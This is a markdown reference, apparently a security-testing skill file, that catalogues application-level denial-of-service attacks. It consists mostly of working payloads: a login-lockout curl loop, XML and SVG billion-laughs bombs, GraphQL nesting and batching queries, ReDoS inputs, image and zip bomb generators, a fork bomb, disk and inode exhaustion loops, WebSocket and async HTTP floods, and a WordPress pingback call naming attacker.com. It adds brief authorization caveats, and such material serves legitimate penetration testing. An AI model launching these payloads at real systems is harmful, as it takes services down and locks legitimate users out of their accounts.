# Denial of Service (DoS)

## Description
Denial of Service attacks aim to make a system, service, or network unavailable to its intended users. This skill covers various application-level DoS techniques that can be discovered during security testing.

**Note:** DoS testing should be performed with extreme caution and explicit authorization. Most bug bounty programs consider DoS out of scope.

## DoS Attack Categories

### 1. Account Locking DoS

Lock out legitimate users by triggering account protection mechanisms.

```bash
# Brute force to trigger account lockout
for i in {1..100}; do
    curl -X POST "https://target.com/login" \
        -d "username=victim&password=wrong$i"
done
```

**Impact:** Legitimate users cannot access their accounts.

### 2. Resource Exhaustion

#### CPU Exhaustion
```python
# ReDoS - Regular Expression DoS
# Vulnerable regex: ^(a+)+$
# Malicious input causes exponential backtracking
payload = "a" * 25 + "!"

# SQL complexity attack
payload = "SELECT * FROM users WHERE " + " OR ".join(["id=" + str(i) for i in range(10000)])
```

#### Memory Exhaustion
```xml
<!-- XML Billion Laughs Attack (XML Bomb) -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

### 3. GraphQL DoS

#### Deeply Nested Query
```graphql
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                name
              }
            }
          }
        }
      }
    }
  }
}
```

#### Batch Query Attack
```graphql
query {
  user1: user(id: 1) { name }
  user2: user(id: 2) { name }
  user3: user(id: 3) { name }
  # ... repeat thousands of times
}
```

#### Field Duplication
```graphql
query {
  user(id: 1) {
    name
    name
    name
    # ... repeat many times
  }
}
```

### 4. ReDoS (Regular Expression DoS)

#### Vulnerable Patterns
```javascript
// Evil regex patterns
^(a+)+$                    // Nested quantifiers
^([a-zA-Z0-9])+\@          // Email validation
(a|aa)+$                   // Alternation with overlap
^(([a-z])+.)+[A-Z]([a-z])+$ // Multiple nested groups
```

#### Testing Payloads
```python
# For regex: ^(a+)+$
payload = "a" * 30 + "!"

# For regex: ^(a|aa)+$
payload = "a" * 25

# For email regex
payload = "a" * 50 + "@"
```

### 5. Image Processing DoS

#### Decompression Bomb (Pixel Flood)
```python
# Create image with huge dimensions but small file size
from PIL import Image

# 100,000 x 100,000 pixels
# Small file (compressed) but huge in memory
img = Image.new('RGB', (100000, 100000), color='white')
img.save('bomb.png', compress_level=9)
```

#### Malformed Image Headers
```python
# PNG with manipulated IHDR chunk
# Claim extremely large dimensions
import struct

# Fake 65535 x 65535 image
ihdr_data = struct.pack('>IIBBBBB', 65535, 65535, 8, 2, 0, 0, 0)
```

### 6. SVG DoS

```xml
<!-- SVG Billion Laughs -->
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!-- ... continue pattern -->
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&lol9;</text>
</svg>
```

### 7. Filesystem DoS

#### Inode Exhaustion
```bash
# Create many empty files to exhaust inodes
for i in $(seq 1 1000000); do
    touch /tmp/file$i
done
```

#### Disk Space Exhaustion
```bash
# Fill disk with data
dd if=/dev/zero of=/tmp/bigfile bs=1M count=10000
```

#### Filename Length Attack
```bash
# Maximum filename length varies by filesystem
# ext4: 255 bytes
filename=$(python -c "print('a' * 255)")
touch "$filename"
```

### 8. Fork Bomb

```bash
# Bash fork bomb
:(){ :|:& };:

# Python equivalent
import os
while True:
    os.fork()
```

### 9. Hash Collision DoS

```python
# If application uses dict/hashmap with predictable hashing
# Send many keys that hash to same bucket
# Degrades O(1) lookup to O(n)

# PHP example - keys that collide in PHP's hash function
colliding_keys = generate_collisions(1000)
payload = {key: "value" for key in colliding_keys}
```

### 10. Zip Bomb

```python
# Create nested zip files
# 42.zip: 42KB compressed, 4.5 PB uncompressed

import zipfile
import os

# Create base file
with open('base.txt', 'w') as f:
    f.write('A' * 1000000)

# Nest in multiple zip files
for i in range(10):
    with zipfile.ZipFile(f'level{i}.zip', 'w', zipfile.ZIP_DEFLATED) as zf:
        if i == 0:
            for j in range(10):
                zf.write('base.txt', f'file{j}.txt')
        else:
            for j in range(10):
                zf.write(f'level{i-1}.zip', f'nested{j}.zip')
```

### 11. WebSocket DoS

```javascript
// Open many WebSocket connections
const connections = [];
for (let i = 0; i < 10000; i++) {
    const ws = new WebSocket('wss://target.com/ws');
    connections.push(ws);
}

// Send large messages
const ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => {
    ws.send('A'.repeat(10000000));
};
```

### 12. Long Password DoS

```bash
# Some applications hash passwords without length limits
# Very long passwords cause CPU exhaustion

curl -X POST "https://target.com/login" \
    -d "username=test&password=$(python -c 'print("A"*1000000)')"
```

## Filesystem Limits Reference

| Filesystem | Max Files | Max File Size |
|-----------|-----------|---------------|
| BTRFS | 2^64 | 16 EiB |
| EXT4 | ~4 billion | 16 TiB |
| FAT32 | ~268 million | 4 GiB |
| NTFS | ~4.2 billion | 16 EiB |
| XFS | Dynamic | 8 EiB |
| ZFS | ~281 trillion | 16 EiB |

## Application-Specific DoS

### WordPress
```bash
# XML-RPC pingback amplification
curl -X POST "https://target.com/xmlrpc.php" \
    -d '<?xml version="1.0"?>
    <methodCall>
        <methodName>pingback.ping</methodName>
        <params>
            <param><value><string>https://attacker.com</string></value></param>
            <param><value><string>https://target.com/post</string></value></param>
        </params>
    </methodCall>'
```

### API Rate Limit Testing
```python
import asyncio
import aiohttp

async def flood(session, url):
    async with session.get(url) as response:
        return response.status

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [flood(session, "https://api.target.com/endpoint") for _ in range(10000)]
        results = await asyncio.gather(*tasks)
        print(f"Completed: {len(results)}")

asyncio.run(main())
```

## Detection Tools

### Identifying Vulnerable Regex
```bash
# Use regex static analysis tools
# recheck - regex vulnerability checker
# rxxr2 - regex denial of service checker
```

### Testing Application Limits
```bash
# Test file upload limits
curl -X POST "https://target.com/upload" \
    -F "file=@large_file.bin"

# Test request size limits
curl -X POST "https://target.com/api" \
    -H "Content-Type: application/json" \
    -d '{"data": "'$(python -c 'print("A"*10000000)'))'"}'
```

## Responsible Testing

1. **Always get explicit authorization**
2. **Start with minimal payloads**
3. **Test in staging environments first**
4. **Have rollback procedures ready**
5. **Monitor target system resources**
6. **Stop immediately if unintended impact occurs**

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Denial%20of%20Service
- https://owasp.org/www-community/attacks/Denial_of_Service
- https://cwe.mitre.org/data/definitions/400.html
